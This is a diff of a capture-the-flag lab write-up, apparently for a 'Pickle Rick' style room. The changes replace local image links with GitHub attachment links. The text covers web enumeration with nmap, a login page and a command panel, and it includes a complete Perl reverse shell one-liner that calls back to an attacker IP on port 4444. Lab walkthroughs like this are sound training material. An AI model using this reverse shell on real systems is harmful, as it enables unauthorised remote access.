@@ -42,17 +42,17 @@ In robots.txt we see a text: Wubbalubbadubdub
 
 With http-enum script from nmap I found a directory login.php where i can verify if the credentials are valid:
 http://10.67.128.80/login.php
-![[Pasted image 20260221124825.png]]
+![imagen](https://github.com/user-attachments/assets/52bf4bc8-13ed-4f35-aa25-2e78cef7b271)
 
 And we gain access to several directories, including a command panel form:
-![[Pasted image 20260221124925.png]]
+![imagen](https://github.com/user-attachments/assets/8d0cb58d-8cba-4a8b-8a3a-41e961ed4a40)
 
 listing files we can see Sup3rS3cretPickl3Ingred.txt, wheree we will find the first ingredient.
-![[Pasted image 20260221130121.png]]
+![imagen](https://github.com/user-attachments/assets/5188f0c7-3fda-4522-bf4e-d356574a8e8f)
 We have cat command disabled but we can access http://10.67.128.80/Sup3rS3cretPickl3Ingred.txt.
 Fort the next ingredient, I am using Reverse Shell Generator:
 
-![[Pasted image 20260221130818.png]]
+![imagen](https://github.com/user-attachments/assets/4ee26021-15d5-444e-88ba-f8fe2a18f83e)
 ```
 perl -e 'use Socket;$i="10.67.181.217";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};'
 ```
